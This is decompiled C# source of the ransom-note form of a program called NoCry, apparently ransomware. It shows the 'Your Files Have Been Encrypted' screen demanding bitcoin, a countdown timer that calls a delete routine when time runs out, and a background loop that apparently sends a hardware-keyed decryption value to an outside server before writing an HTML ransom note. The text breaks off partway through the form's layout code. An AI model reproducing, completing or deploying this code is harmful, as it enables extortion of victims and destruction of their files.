using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NoCry.My;
using NoCry.My.Resources;

namespace NoCry;

[DesignerGenerated]
public class Form1 : Form
{
	private double hour;

	private double minute;

	private double second;

	private object h;

	private object m;

	private object s;

	private object P;

	private object mx;

	private IContainer components;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = PictureBox1_Click;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).remove_Click(eventHandler);
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click_1;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label3
	{
		[CompilerGenerated]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label3_Click;
			Label label = _Label3;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label3 = value;
			label = _Label3;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Label4_Click;
			Label label = _Label4;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label4 = value;
			label = _Label4;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox2")]
	internal virtual GroupBox GroupBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			LinkLabel linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	internal virtual LinkLabel LinkLabel2
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel2_LinkClicked);
			LinkLabel linkLabel = _LinkLabel2;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel2 = value;
			linkLabel = _LinkLabel2;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual LinkLabel LinkLabel3
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel3_LinkClicked);
			LinkLabel linkLabel = _LinkLabel3;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel3 = value;
			linkLabel = _LinkLabel3;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			BackgroundWorker backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			backgroundWorker = _BackgroundWorker1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		h = Interaction.GetSetting("H", "0", St.Setting, "");
		m = Interaction.GetSetting("M", "0", St.Setting, "");
		s = Interaction.GetSetting("S", "0", St.Setting, "");
		P = Interaction.GetSetting("P", "0", St.Setting, "");
		mx = Interaction.GetSetting("X", "0", St.Setting, "");
		InitializeComponent();
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(TextBox1.get_Text());
			MessageBox.Show("Copied To Clipboard");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Label1.set_Text("Send $" + St.amount + " worth of bitcoin to this address:");
			TextBox1.set_Text(St.btc);
			if (Operators.ConditionalCompareObjectEqual(h, (object)null, false))
			{
				Interaction.SaveSetting("H", "0", St.Setting, Conversions.ToString(St.H));
				hour = Conversions.ToDouble(Interaction.GetSetting("H", "0", St.Setting, ""));
				int maximum = Conversions.ToInteger(Interaction.GetSetting("H", "0", St.Setting, ""));
				ProgressBar1.set_Maximum(maximum);
			}
			else
			{
				hour = Conversions.ToDouble(Interaction.GetSetting("H", "0", St.Setting, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(m, (object)null, false))
			{
				Interaction.SaveSetting("M", "0", St.Setting, Conversions.ToString(St.m));
				minute = Conversions.ToDouble(Interaction.GetSetting("M", "0", St.Setting, ""));
			}
			else
			{
				minute = Conversions.ToDouble(Interaction.GetSetting("M", "0", St.Setting, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(s, (object)null, false))
			{
				Interaction.SaveSetting("S", "0", St.Setting, Conversions.ToString(59));
				second = Conversions.ToDouble(Interaction.GetSetting("S", "0", St.Setting, ""));
			}
			else
			{
				second = Conversions.ToDouble(Interaction.GetSetting("S", "0", St.Setting, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(P, (object)null, false))
			{
				Interaction.SaveSetting("P", "0", St.Setting, Conversions.ToString(0));
				int value = Conversions.ToInteger(Interaction.GetSetting("P", "0", St.Setting, ""));
				ProgressBar1.set_Value(value);
			}
			else
			{
				int value2 = Conversions.ToInteger(Interaction.GetSetting("P", "0", St.Setting, ""));
				ProgressBar1.set_Value(value2);
			}
			if (Operators.ConditionalCompareObjectEqual(mx, (object)null, false))
			{
				Interaction.SaveSetting("X", "0", St.Setting, Conversions.ToString(St.H));
				int maximum2 = Conversions.ToInteger(Interaction.GetSetting("X", "0", St.Setting, ""));
				ProgressBar1.set_Maximum(maximum2);
			}
			else
			{
				int maximum3 = Conversions.ToInteger(Interaction.GetSetting("X", "0", St.Setting, ""));
				ProgressBar1.set_Maximum(maximum3);
			}
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void LinkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.google.com/search?q=how+to+buy+bitcoin");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Control)MyProject.Forms.Form2).Show();
	}

	private void Button1_Click_1(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form2 form = new Form2();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form3 form = new Form3();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form4 form = new Form4();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void LinkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if ((hour == 0.0) & (minute == 0.0))
			{
				Label9.set_Text("0");
				Label7.set_Text("0");
				Timer1.Stop();
				((Control)this).Hide();
				Interaction.SaveSetting("D", "0", St.Setting, "OK");
				del.del();
			}
			else
			{
				Label9.set_Text(Conversions.ToString(hour));
				Label7.set_Text(Conversions.ToString(minute));
				Interaction.SaveSetting("H", "0", St.Setting, Conversions.ToString(hour));
				Interaction.SaveSetting("M", "0", St.Setting, Conversions.ToString(minute));
				Interaction.SaveSetting("S", "0", St.Setting, Conversions.ToString(second));
			}
			if (minute == 0.0)
			{
				hour -= 1.0;
				minute = 59.0;
				ProgressBar1.Increment(1);
				Interaction.SaveSetting("P", "0", St.Setting, Conversions.ToString(ProgressBar1.get_Value()));
			}
			else if (second == 0.0)
			{
				minute -= 1.0;
				second = 59.0;
			}
			else
			{
				second -= 1.0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		do
		{
			Thread.Sleep(2000);
		}
		while (!Module1.sends(Conversions.ToString(Operators.ConcatenateObject((object)(St.hash + "="), check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), Module1.HWID() + Module1.HWID())))));
		Interaction.SaveSetting("F", "0", St.Setting, "Done");
		Interaction.SaveSetting("C", "0", St.Setting, "Done");
		string html = Resources.html;
		html = html.Replace("%M%", "$" + St.amount);
		html = html.Replace("%BTC%", St.btc);
		html = html.Replace("%Email%", St.email);
		StreamWriter streamWriter = new StreamWriter(St.html, append: false);
		streamWriter.WriteLine(html);
		streamWriter.Close();
		if (BackgroundWorker1.IsBusy && BackgroundWorker1.WorkerSupportsCancellation)
		{
			BackgroundWorker1.CancelAsync();
		}
	}

	private void Label3_Click(object sender, EventArgs e)
	{
	}

	private void Label4_Click(object sender, EventArgs e)
	{
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_033d: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_041c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0426: Expected O, but got Unknown
		//IL_0462: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_054a: Expected O, but got Unknown
		//IL_057b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f1: Expected O, but got Unknown
		//IL_061e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0690: Unknown result type (might be due to invalid IL or missing references)
		//IL_069a: Expected O, but got Unknown
		//IL_06ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_073c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0746: Expected O, but got Unknown
		//IL_0776: Unknown result type (might be due to invalid IL or missing references)
		//IL_081e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0828: Expected O, but got Unknown
		//IL_0859: Unknown result type (might be due to invalid IL or missing references)
		//IL_087d: Unknown result type (might be due to invalid IL or missing references)
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0902: Expected O, but got Unknown
		//IL_093e: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_09ce: Expected O, but got Unknown
		//IL_0a0a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ab8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b40: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b4a: Expected O, but got Unknown
		//IL_0b86: Unknown result type (might be due to invalid IL or missing references)
		//IL_0c0b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d53: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dbc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dc6: Expected O, but got Unknown
		//IL_0df3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e5c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0e66: Expected O, but got Unknown
		//IL_0e93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0efc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f06: Expected O, but got Unknown
		//IL_0f32: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fb9: Unknown result type (might be due to invalid IL or missing references)
		//IL_1140: Unknown result type (might be due to invalid IL or missing references)
		//IL_114a: Expected O, but got Unknown
		//IL_114f: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Button1 = new Button();
		GroupBox1 = new GroupBox();
		Button2 = new Button();
		TextBox1 = new TextBox();
		Label1 = new Label();
		PictureBox2 = new PictureBox();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		GroupBox2 = new GroupBox();
		LinkLabel1 = new LinkLabel();
		LinkLabel2 = new LinkLabel();
		Button3 = new Button();
		LinkLabel3 = new LinkLabel();
		PictureBox1 = new PictureBox();
		Panel1 = new Panel();
		ProgressBar1 = new ProgressBar();
		Label7 = new Label();
		Label8 = new Label();
		Label9 = new Label();
		Label10 = new Label();
		Timer1 = new Timer(components);
		BackgroundWorker1 = new BackgroundWorker();
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)GroupBox2).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)Button1).set_BackColor(Color.White);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(640, 546));
		((Control)Button1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(252, 36));
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)PictureBox2);
		((Control)GroupBox1).set_Location(new Point(205, 450));
		((Control)GroupBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Padding(new Padding(4, 4, 4, 4));
		((Control)GroupBox1).set_Size(new Size(708, 89));
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		((ButtonBase)Button2).set_BackColor(Color.White);
		((Control)Button2).set_Cursor(Cursors.get_Hand());
		((Control)Button2).set_ForeColor(Color.Black);
		((Control)Button2).set_Location(new Point(576, 52));
		((Control)Button2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(111, 28));
		((Control)Button2).set_TabIndex(4);
		((ButtonBase)Button2).set_Text("Copy");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((Control)TextBox1).set_Location(new Point(196, 52));
		((Control)TextBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		((Control)TextBox1).set_Size(new Size(371, 22));
		((Control)TextBox1).set_TabIndex(4);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 192, 0));
		((Control)Label1).set_Location(new Point(157, 21));
		((Control)Label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 17));
		((Control)Label1).set_TabIndex(4);
		PictureBox2.set_Image((Image)(object)Resources.bitcoin);
		((Control)PictureBox2).set_Location(new Point(0, 30));
		((Control)PictureBox2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)PictureBox2).set_Name("PictureBox2");
		((Control)PictureBox2).set_Size(new Size(172, 47));
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(4);
		PictureBox2.set_TabStop(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Tahoma", 14.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(289, 15));
		((Control)Label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(512, 29));
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Ooops, Your Files Have Been Encrypted !!!");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(8, 23));
		((Control)Label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(650, 105));
		((Control)Label3).set_TabIndex(6);
		Label3.set_Text(componentResourceManager.GetString("Label3.Text"));
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(8, 138));
		((Control)Label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(691, 105));
		((Control)Label4).set_TabIndex(7);
		Label4.set_Text(componentResourceManager.GetString("Label4.Text"));
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(8, 255));
		((Control)Label5).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(677, 126));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text(componentResourceManager.GetString("Label5.Text"));
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox2).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox2).set_ForeColor(Color.White);
		((Control)GroupBox2).set_Location(new Point(205, 58));
		((Control)GroupBox2).set_Margin(new Padding(4, 4, 4, 4));
		((Control)GroupBox2).set_Name("GroupBox2");
		((Control)GroupBox2).set_Padding(new Padding(4, 4, 4, 4));
		((Control)GroupBox2).set_Size(new Size(741, 396));
		((Control)GroupBox2).set_TabIndex(6);
		GroupBox2.set_TabStop(false);
		GroupBox2.set_Text("Can I Recover My Files ?");
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel1).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		LinkLabel1.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel1).set_Location(new Point(24, 450));
		((Control)LinkLabel1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)LinkLabel1).set_Name("LinkLabel1");
		((Control)LinkLabel1).set_Size(new Size(114, 23));
		((Control)LinkLabel1).set_TabIndex(10);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("Contact Us");
		((Label)LinkLabel2).set_AutoSize(true);
		((Control)LinkLabel2).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel2).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		LinkLabel2.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel2).set_Location(new Point(12, 411));
		((Control)LinkLabel2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)LinkLabel2).set_Name("LinkLabel2");
		((Control)LinkLabel2).set_Size(new Size(164, 21));
		((Control)LinkLabel2).set_TabIndex(11);
		((Label)LinkLabel2).set_TabStop(true);
		LinkLabel2.set_Text("How to buy bitcoins?");
		((ButtonBase)Button3).set_BackColor(Color.White);
		((Control)Button3).set_Cursor(Cursors.get_Hand());
		((Control)Button3).set_ForeColor(Color.Black);
		((Control)Button3).set_Location(new Point(205, 546));
		((Control)Button3).set_Margin(new Padding(4, 4, 4, 4));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(252, 36));
		((Control)Button3).set_TabIndex(4);
		((ButtonBase)Button3).set_Text("Show Encrypted Files");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((Label)LinkLabel3).set_AutoSize(true);
		((Control)LinkLabel3).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		LinkLabel3.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel3).set_Location(new Point(24, 372));
		((Control)LinkLabel3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)LinkLabel3).set_Name("LinkLabel3");
		((Control)LinkLabel3).set_Size(new Size(108, 21));
		((Control)LinkLabel3).set_TabIndex(12);
		((Label)LinkLabel3).set_TabStop(true);
		LinkLabel3.set_Text("About bitcoin");
		PictureBox1.set_Image((Image)(object)Resources.Pic1);
		((Control)PictureBox1).set_Location(new Point(16, 15));
		((Control)PictureBox1).set_Margin(new Padding(4, 4, 4, 4));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(179, 161));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)Panel1).set_BackColor(Color.Maroon);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label7);
		((Control)Panel1).get_Controls().Add((Control)(object)Label8);
